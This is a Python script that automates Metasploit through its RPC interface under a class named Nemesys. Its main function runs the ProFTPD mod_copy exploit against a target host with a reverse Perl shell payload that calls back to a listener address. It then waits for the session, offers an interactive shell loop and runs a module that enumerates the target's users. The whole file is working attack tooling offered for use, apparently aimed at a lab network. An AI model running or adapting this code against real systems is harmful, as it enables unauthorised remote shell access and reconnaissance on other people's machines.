from pymetasploit3.msfrpc import MsfRpcClient
import time

class Nemesys:
    def __init__(self, password, ssl=True):
        """Initializes and connects to the Metasploit client."""
        self.client = MsfRpcClient(password, ssl=ssl)
        print("Connected to Metasploit!")

    def search_exploits(self, keyword):
        """Searches for exploits in Metasploit based on a keyword."""
        exploits = self.client.modules.exploits
        filtered_exploits = [exploit for exploit in exploits if keyword.lower() in exploit.lower()]
        print(f"Exploits containing '{keyword}':")
        for exploit in filtered_exploits:
            print(exploit)

    def setup_and_run_exploit(self, exploit_name, rhosts, sitepath, payload_name, lhost, lport):
        """Configures and executes a specific exploit with the chosen payload."""
        exploit = self.client.modules.use("exploit", exploit_name)
        exploit['RHOSTS'] = rhosts
        exploit['SITEPATH'] = sitepath

        payload = self.client.modules.use("payload", payload_name)
        payload['LHOST'] = lhost
        payload['LPORT'] = lport

        print(f"Running exploit {exploit_name}...")
        output = exploit.execute(payload=payload)
        print("Exploit execution result:", output)
        
        return output.get('uuid')

    def get_session_id(self, uuid, timeout=15):
        """Retrieves the session ID generated by an exploit, if available."""
        end_time = time.time() + timeout
        while time.time() < end_time:
            sessions = self.client.sessions.list
            for session in sessions:
                if sessions[session].get('exploit_uuid') == uuid:
                    print(f"Session found with ID: {session}")
                    return session
            time.sleep(1)
        print("No session found.")
        return None

    def interact_with_session(self, session_id):
        """Allows interaction with an open shell session."""
        shell = self.client.sessions.session(session_id)
        print("Interacting with the session...")

        try:
            while True:
                command = input("$ ")
                if command.lower() == 'exit':
                    break
                shell.write(command + '\n')
                time.sleep(1)
                print(shell.read())
        except KeyboardInterrupt:
            print("Exiting interactive session.")

    def post_exploitation(self, session_id, post_module):
        """Performs post-exploitation actions using a specified module."""
        console_id = self.client.consoles.console().cid
        self.client.consoles.console(console_id).write(f'use {post_module}\n')
        self.client.consoles.console(console_id).write(f'set SESSION {session_id}\n')
        self.client.consoles.console(console_id).write('run\n')

        time.sleep(20)
        output = self.client.consoles.console(console_id).read()
        print("Post-exploitation results:")
        print(output['data'])

        self.client.consoles.console(console_id).destroy()

def main():
    """Main function that orchestrates the flow using the Nemesys class."""
    client = Nemesys("password")

    # Exploit and payload configuration
    exploit_name = "unix/ftp/proftpd_modcopy_exec"
    rhosts = '192.168.11.128'
    sitepath = '/var/www/html'
    payload_name = 'cmd/unix/reverse_perl'
    lhost = '192.168.11.129'
    lport = 4445

    # Execute the exploit
    job_id = client.setup_and_run_exploit(exploit_name, rhosts, sitepath, payload_name, lhost, lport)
    session_id = client.get_session_id(job_id)

    if session_id:
        # Post-exploitation module
        post_module = '/linux/gather/enum_users'
        client.post_exploitation(session_id, post_module)
    else:
        print("Could not establish a session.")

if __name__ == "__main__":
    main()